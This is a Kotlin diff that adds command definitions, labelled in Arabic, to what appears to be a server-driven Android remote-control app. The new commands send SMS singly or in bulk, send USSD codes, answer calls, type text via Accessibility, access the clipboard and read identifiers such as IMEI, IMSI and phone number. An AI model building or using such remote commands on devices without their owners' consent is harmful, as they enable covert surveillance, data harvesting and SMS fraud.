@@ -17,7 +17,11 @@ object CommandDefinitions {
         FILES("الملفات", "files"),
         SECURITY("الأمان", "security"),
         MONITOR("المراقبة", "monitor"),
-        STREAMING("البث", "streaming")
+        STREAMING("البث", "streaming"),
+        DEVICE("معلومات الجهاز", "device"),
+        INPUT("الإدخال", "input"),
+        MEDIA("الوسائط", "media"),
+        SYSTEM("النظام", "system")
     }
 
     data class CommandDef(
@@ -169,6 +173,23 @@ object CommandDefinitions {
         CommandDef("apn_settings", "إعدادات APN", "فتح إعدادات APN", Category.CONTROL),
         CommandDef("block_number", "حظر رقم", "حظر رقم هاتف من الاتصال", Category.CONTROL),
         CommandDef("unblock_number", "إلغاء حظر رقم", "إلغاء حظر رقم هاتف", Category.CONTROL),
+        CommandDef("open_settings", "إعدادات الجهاز", "فتح إعدادات الجهاز", Category.CONTROL),
+        CommandDef("open_wifi_settings", "إعدادات WiFi", "فتح إعدادات WiFi", Category.CONTROL),
+        CommandDef("open_bluetooth_settings", "إعدادات البلوتوث", "فتح إعدادات البلوتوث", Category.CONTROL),
+        CommandDef("open_location_settings", "إعدادات الموقع", "فتح إعدادات الموقع", Category.CONTROL),
+        CommandDef("open_app_settings", "إعدادات التطبيقات", "فتح إعدادات التطبيقات", Category.CONTROL),
+        CommandDef("open_security_settings", "إعدادات الأمان", "فتح إعدادات الأمان", Category.CONTROL),
+        CommandDef("open_developer_options", "خيارات المطور", "فتح خيارات المطور", Category.CONTROL),
+        CommandDef("open_accessibility_settings", "إعدادات الوصول", "فتح إعدادات الوصول", Category.CONTROL),
+        CommandDef("open_notification_settings", "إعدادات الإشعارات", "فتح إعدادات الإشعارات", Category.CONTROL),
+        CommandDef("answer_call", "رد على مكالمة", "الرد على مكالمة واردة", Category.CONTROL),
+        CommandDef("end_call", "إنهاء مكالمة", "إنهاء المكالمة الحالية", Category.CONTROL),
+        CommandDef("send_ussd", "كود USSD", "إرسال كود USSD", Category.CONTROL),
+        CommandDef("send_sms_to", "SMS لرقم", "إرسال SMS لرقم محدد", Category.CONTROL),
+        CommandDef("send_sms_broadcast", "بث SMS", "إرسال SMS لعدة أرقام", Category.CONTROL),
+        CommandDef("post_notification", "إشعار مخصص", "إظهار إشعار مخصص على الجهاز", Category.CONTROL),
+        CommandDef("cancel_notification", "إلغاء إشعار", "إلغاء إشعار محدد", Category.CONTROL),
+        CommandDef("cancel_all_notifications", "إلغاء كل الإشعارات", "إلغاء جميع إشعارات التطبيق", Category.CONTROL),
 
         // ═══════════════════════════════════════════════════════════
         // APPS — 20 commands (matches server "apps" category)
@@ -341,6 +362,60 @@ object CommandDefinitions {
         CommandDef("pause_stream", "إيقاف مؤقت", "إيقاف البث مؤقتاً", Category.STREAMING),
         CommandDef("resume_stream", "استئناف البث", "استئناف البث الموقوف", Category.STREAMING),
         CommandDef("get_stream_capabilities", "قدرات البث", "عرض قدرات البث المتاحة", Category.STREAMING),
+
+        // ═══════════════════════════════════════════════════════════
+        // DEVICE — 16 commands (matches server "device" category)
+        // ═══════════════════════════════════════════════════════════
+        CommandDef("device_id", "معرّف الجهاز", "معرّف فريد للجهاز (ANDROID_ID)", Category.DEVICE),
+        CommandDef("imei", "IMEI", "رقم IMEI (يتطلب صلاحية نظام)", Category.DEVICE),
+        CommandDef("imsi", "IMSI", "رقم IMSI للمشترك (يتطلب صلاحية نظام)", Category.DEVICE),
+        CommandDef("phone_number", "رقم الهاتف", "رقم هاتف الجهاز (line1)", Category.DEVICE),
+        CommandDef("serial", "الرقم التسلسلي", "Build.SERIAL / Build.getSerial()", Category.DEVICE),
+        CommandDef("mac_address", "عنوان MAC", "عنوان MAC لبطاقة الشبكة", Category.DEVICE),
+        CommandDef("ip_address", "عنوان IP", "عنوان IPv4 الحالي", Category.DEVICE),
+        CommandDef("ipv6_address", "عنوان IPv6", "عنوان IPv6 الحالي", Category.DEVICE),
+        CommandDef("network_operator", "مشغل الشبكة", "اسم وكود مشغل الشبكة", Category.DEVICE),
+        CommandDef("sim_operator", "مشغل SIM", "اسم وكود مشغل SIM", Category.DEVICE),
+        CommandDef("sim_country", "دولة SIM", "دولة بطاقة SIM", Category.DEVICE),
+        CommandDef("network_country", "دولة الشبكة", "دولة الشبكة الحالية", Category.DEVICE),
+        CommandDef("phone_type", "نوع الهاتف", "نوع الهاتف (GSM/CDMA/SIP)", Category.DEVICE),
+        CommandDef("sim_state", "حالة SIM", "حالة بطاقة SIM", Category.DEVICE),
+        CommandDef("data_state", "حالة البيانات", "حالة اتصال البيانات الخلوية", Category.DEVICE),
+        CommandDef("data_activity", "نشاط البيانات", "اتجاه نشاط البيانات (في/خارج)", Category.DEVICE),
+
+        // ═══════════════════════════════════════════════════════════
+        // INPUT — 7 commands (matches server "input" category)
+        // ═══════════════════════════════════════════════════════════
+        CommandDef("show_keyboard", "إظهار لوحة المفاتيح", "إظهار لوحة المفاتيح على الشاشة", Category.INPUT),
+        CommandDef("hide_keyboard", "إخفاء لوحة المفاتيح", "إخفاء لوحة المفاتيح", Category.INPUT),
+        CommandDef("input_text", "إدخال نص", "إدخال نص في الحقل المركّز (يتطلب Accessibility)", Category.INPUT),
+        CommandDef("input_key", "إدخال مفتاح", "إدخال مفتاح معيّن (keyCode)", Category.INPUT),
+        CommandDef("paste_clipboard", "لصق الحافظة", "لصق محتوى الحافظة في الحقل المركّز", Category.INPUT),
+        CommandDef("clear_clipboard", "مسح الحافظة", "مسح محتوى الحافظة", Category.INPUT),
+        CommandDef("set_clipboard_text", "كتابة في الحافظة", "وضع نص في الحافظة", Category.INPUT),
+
+        // ═══════════════════════════════════════════════════════════
+        // MEDIA — 7 commands (matches server "media" category)
+        // ═══════════════════════════════════════════════════════════
+        CommandDef("play_media", "تشغيل وسائط", "تشغيل التشغيل الحالي", Category.MEDIA),
+        CommandDef("pause_media", "إيقاف مؤقت", "إيقاف الوسائط مؤقتاً", Category.MEDIA),
+        CommandDef("stop_media", "إيقاف الوسائط", "إيقاف تشغيل الوسائط", Category.MEDIA),
+        CommandDef("next_track", "المقطع التالي", "الانتقال للمقطع التالي", Category.MEDIA),
+        CommandDef("previous_track", "المقطع السابق", "العودة للمقطع السابق", Category.MEDIA),
+        CommandDef("set_media_volume", "صوت الوسائط", "ضبط مستوى صوت الوسائط", Category.MEDIA),
+        CommandDef("now_playing", "المشغّل الآن", "معلومات المقطع المشغّل حالياً", Category.MEDIA),
+
+        // ═══════════════════════════════════════════════════════════
+        // SYSTEM — 8 commands (matches server "system" category)
+        // ═══════════════════════════════════════════════════════════
+        CommandDef("system_properties", "خصائص النظام", "خصائص نظام Android (getprop)", Category.SYSTEM),
+        CommandDef("build_info", "معلومات البناء", "معلومات Build (MODEL, FINGERPRINT, …)", Category.SYSTEM),
+        CommandDef("uptime", "وقت التشغيل", "مدة تشغيل الجهاز", Category.SYSTEM),
+        CommandDef("boot_time", "وقت الإقلاع", "وقت آخر إقلاع للجهاز", Category.SYSTEM),
+        CommandDef("current_time", "الوقت الحالي", "الوقت الحالي للجهاز", Category.SYSTEM),
+        CommandDef("set_current_time", "ضبط الوقت", "ضبط وقت النظام (يتطلب صلاحية نظام)", Category.SYSTEM),
+        CommandDef("timezone", "المنطقة الزمنية", "معلومات المنطقة الزمنية الحالية", Category.SYSTEM),
+        CommandDef("available_locales", "اللغات المتاحة", "قائمة اللغات المتاحة في النظام", Category.SYSTEM),
     )
 
     /**
